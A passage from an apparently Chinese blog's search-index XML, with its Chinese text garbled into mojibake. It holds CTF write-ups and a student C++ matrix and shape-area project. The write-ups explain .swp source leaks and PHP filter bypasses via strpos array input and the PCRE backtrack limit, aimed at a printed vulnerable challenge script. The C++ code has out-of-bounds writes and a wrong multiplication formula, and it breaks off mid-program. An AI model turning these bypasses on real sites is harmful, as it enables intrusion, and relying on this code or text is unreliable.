class="line">å®ƒçš„åŸç†æ˜¯é€šè¿‡åœ¨æ–‡æœ¬æ–‡ä»¶çš„æœ«å°¾åµŒå…¥ç©ºæ ¼å’Œåˆ¶è¡¨ä½çš„æ–¹å¼åµŒå…¥éšè—ä¿¡æ¯ï¼Œ</span><br><span class="line">ä¸åŒç©ºæ ¼ä¸åˆ¶è¡¨ä½çš„ç»„åˆä»£è¡¨ä¸åŒçš„åµŒå…¥ä¿¡æ¯ã€‚</span><br></pre></td></tr></table></figure><p>è§£å¯†ç½‘å€ï¼š<a href="http://fog.misty.com/perry/ccs/snow/snow/snow.html" target="_blank" rel="noopener">http://fog.misty.com/perry/ccs/snow/snow/snow.html</a><br>å¯†é’¥ä¸ºé¢˜ç›®åå­—<br><img src="http://pkf8r5ond.bkt.clouddn.com/19-1-9/37624188.jpg" alt=""></p><h2 id="gift-php"><a href="#gift-php" class="headerlink" title="gift php"></a>gift php</h2><p>Do you know .swp file? éæ­£å¸¸å…³é—­viç¼–è¾‘å™¨æ—¶ä¼šç”Ÿæˆä¸€ä¸ª.swpæ–‡ä»¶<br>è®¿é—®.index.php.swpä¸‹è½½ä¸‹æ¥ï¼Œ vim-r.index.php.swpè¿˜åŸå³å¯ æºç </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">areyouok</span><span class="params">($greeting)</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> preg_match(<span class="string">'/Merry.*Christmas/is'</span>,$greeting);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$greeting=@$_POST[<span class="string">'greeting'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!areyouok($greeting))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(strpos($greeting,<span class="string">'Merry Christmas'</span>)!==<span class="keyword">false</span>)&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'Merry Christmas. '</span>.<span class="string">'flag&#123;****&#125;'</span>;</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'Do you know .swp file?'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'Do you know PHP?'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>è¦æ±‚postä¸€ä¸ª greetingå‚æ•°ï¼Œç»è¿‡areyouokå‡½æ•°æ­£åˆ™è¿‡æ»¤åå¦‚æœè¿”å›falseï¼Œ<br>å°±è¿›å…¥ä¸‹ä¸€ä¸ªifï¼Œå¦‚æœ greetingå‚æ•°åŒ…å« MerryChristmasåˆ™æ‰“å°flagã€‚<br>å¯ä»¥åˆ©ç”¨strposå‡½æ•°çš„ä¸€ä¸ªæ¼æ´ï¼Œä¼ å…¥ä¸€ä¸ªæ•°ç»„ï¼Œä¼šè¿”å› NULLï¼Œ NULLä¸å¼ºç­‰äºfalseï¼Œå³å¯ç»•è¿‡ã€‚<br><img src="http://pkf8r5ond.bkt.clouddn.com/19-1-9/41317872.jpg" alt=""></p><h2 id="gift-php-plus"><a href="#gift-php-plus" class="headerlink" title="gift php plus"></a>gift php plus</h2><p><img src="http://pkf8r5ond.bkt.clouddn.com/19-1-9/59998626.jpg" alt=""><br>è¿™é¢˜æ˜¯åœ¨gift phpçš„åŸºç¡€ä¸ŠåŠ ä¸Šäº†is_arrayçš„åˆ¤æ–­ï¼Œä¸å…è®¸ä½¿ç”¨æ•°ç»„æ¥ç»•è¿‡ã€‚</p><p>æ‰€ä»¥ä¸Šä¸€é“é¢˜çš„æ€è·¯ä¸èƒ½å†ç”¨äº†ã€‚ è¿™é‡Œéœ€è¦ç”¨åˆ°æ­£åˆ™å›æº¯ï¼Œå¯ä»¥å‚è€ƒpç‰›çš„æ–‡ç« ï¼š<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p><p>PHPä¸ºäº†é˜²æ­¢æ­£åˆ™è¡¨è¾¾å¼çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆreDOSï¼‰ï¼Œç»™pcreè®¾å®šäº†ä¸€ä¸ªå›æº¯æ¬¡æ•°ä¸Šé™ pcre.backtrack_limitï¼Œé»˜è®¤ä¸º100ä¸‡ã€‚å½“æ­£åˆ™å›æº¯è¶…è¿‡è¿™ä¸ªä¸Šé™æ—¶ï¼Œå°±ä¼šè¿”å›falseã€‚</p><p>å› æ­¤æˆ‘ä»¬åªè¦post100ä¸‡ä¸ªå­—ç¬¦ï¼Œè®©å®ƒå›æº¯å¤§äº100ä¸‡æ¬¡ï¼Œå‡½æ•°å°±ä¼šè¿”å›falseï¼Œä»è€Œç»•è¿‡ifåˆ¤æ–­ã€‚</p><p><img src="http://pkf8r5ond.bkt.clouddn.com/19-1-9/10130370.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>å¤§äºŒä¸Šå­¦æœŸæœŸæœ«C++è¯¾ç¨‹è®¾è®¡</title>
      <link href="/2019/01/12/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E6%9C%9F%E6%9C%9F%E6%9C%ABC-%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"/>
      <url>/2019/01/12/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E6%9C%9F%E6%9C%9F%E6%9C%ABC-%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h2 id="é¢˜ç›®ä¸€çŸ©é˜µè¿ç®—"><a href="#é¢˜ç›®ä¸€çŸ©é˜µè¿ç®—" class="headerlink" title="é¢˜ç›®ä¸€çŸ©é˜µè¿ç®—"></a>é¢˜ç›®ä¸€çŸ©é˜µè¿ç®—</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Matrix</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> b[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> result[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Matrix();</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">subtraction</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">multiplication</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">division</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transpose</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line">Matrix::Matrix()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    a[<span class="number">2</span>][<span class="number">2</span>]=<span class="number">0</span>;</span><br><span class="line">b[<span class="number">2</span>][<span class="number">2</span>]=<span class="number">0</span>;</span><br><span class="line">result[<span class="number">2</span>][<span class="number">2</span>]=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"è¯·è¾“å…¥çŸ©é˜µA:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">2</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a[i][j];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"è¯·è¾“å…¥çŸ©é˜µB:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">2</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;b[i][j];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"ä½ è¾“å…¥çš„çŸ©é˜µAä¸º"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">2</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;a[i][j]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">"ä½ è¾“å…¥çš„çŸ©é˜µBä¸º"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">2</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;b[i][j]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> Matrix::add()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"ç›¸åŠ ç»“æœä¸º"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">2</span>;++j)</span><br><span class="line">&#123;</span><br><span class="line">result[i][j] = a[i][j]+b[i][j];</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;result[i][j]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">&#125;<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> Matrix::subtraction()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"ç›¸åŠ ç»“æœä¸º"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">2</span>;++j)</span><br><span class="line">&#123;</span><br><span class="line">result[i][j] = a[i][j]-b[i][j];</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;result[i][j]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">&#125;<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> Matrix::multiplication()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">2</span>;j++)</span><br><span class="line">&#123;</span><br><span class="line">result[i][j] = a[i][j]*b[i][j] + a[i][j]*b[j][i];</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;result[i][j]&lt;&lt;<span class="string">"  "</span>;</span><br><span class="line">&#125;<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> Matrix::division()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> Matrix::transpose()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Aè½¬ç½®ä¸º:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">2</span>;++j)</span><br><span class="line">&#123;</span><br><span class="line">result[i][j]=a[j][i];</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;result[i][j]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">&#125;<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Bè½¬ç½®ä¸º:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">2</span>;++j)</span><br><span class="line">&#123;</span><br><span class="line">result[i][j]=b[j][i];</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;result[i][j]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">&#125;<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> h;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"-------------------"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">":        èœå•      "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">":      1.åŠ æ³•      "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">":      2.å‡æ³•      "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">":      3.ä¹˜æ³•      "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">":      4.é™¤æ³•      "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">":      5.è½¬ç½®      "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">":      0.é€€å‡º      "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"-------------------"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"è¯·è¾“å…¥è¦è¿›è¡Œçš„æ“ä½œ"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt;h;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">switch</span>(h)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">&#123;</span><br><span class="line">Matrix M;</span><br><span class="line">M.add();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">&#123;</span><br><span class="line">Matrix M;</span><br><span class="line">M.subtraction();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">&#123;</span><br><span class="line">Matrix M;</span><br><span class="line">M.multiplication();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">&#123;</span><br><span class="line">Matrix M;</span><br><span class="line">M.division();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">&#123;</span><br><span class="line">Matrix M;</span><br><span class="line">M.transpose();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"é€€å‡ºæˆåŠŸ"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>: <span class="built_in">cout</span>&lt;&lt;<span class="string">"è¾“å…¥é”™è¯¯"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="é¢˜ç›®äºŒ-æ±‚ä¸åŒå›¾å½¢é¢ç§¯"><a href="#é¢˜ç›®äºŒ-æ±‚ä¸åŒå›¾å½¢é¢ç§¯" class="headerlink" title="é¢˜ç›®äºŒ  æ±‚ä¸åŒå›¾å½¢é¢ç§¯"></a>é¢˜ç›®äºŒ  æ±‚ä¸åŒå›¾å½¢é¢ç§¯</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Graphic</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">double</span> length;</span><br><span class="line"><span class="keyword">double</span> tall;</span><br><span class="line">Graphic(<span class="built_in">string</span> s,<span class="keyword">double</span> a,<span class="keyword">double</span> b=<span class="number">0</span>):name(s),length(a),tall(b)&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>=<span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Square</span>:</span><span class="keyword">public</span> Graphic</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Square(<span class="keyword">double</span> a):Graphic(<span class="string">"Square"</span>,a)</span><br><span class="line">&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Square'area:"</span>&lt;&lt;length*length&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ~Square();</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span>:</span><span class="keyword">public</span> Graphic</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Circle(<span class="keyword">double</span> a):Graphic(<span class="string">"Circle"</span>,a)&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Circle'area:"</span>&lt;&lt;length*length*<span class="number">3.14</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">triangle</span>:</span><span class="keyword">public</span> Graphic</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">triangle(<span class="keyword">double</span> a,<span class="keyword">double</span> b):Graphic(<span class="string">"Circle"</span>,a,b)&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//double i</span></span><br><span class="line">        <span class="comment">//i =</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"triangle'area:"</span>&lt;&lt;(length*tall)/<span class="number">2</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Graphic *gp;</span><br><span class="line"><span class="built_in">string</span> type;  <span class="comment">// å®šä¹‰å›¾å½¢çš„ç±»å‹</span></span><br><span class="line"><span class="keyword">double</span> value;</span><br><span class="line"><span class="keyword">double</span> tall;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"what'type"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;type;</span><br><span class="line"><span class="comment">// cout&lt;&lt;"what'value"&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">// cin&gt;&gt;value;</span></span><br><span class="line"><span class="keyword">if</span>(type==<span class="string">"Square"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"what'value"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;value;</span><br><span class="line">gp = <span class="keyword">new</span> Square(value);</span><br><span class="line">gp -&gt;show();</span><br><span class="line">&#125;</span><br><span class="line"><span 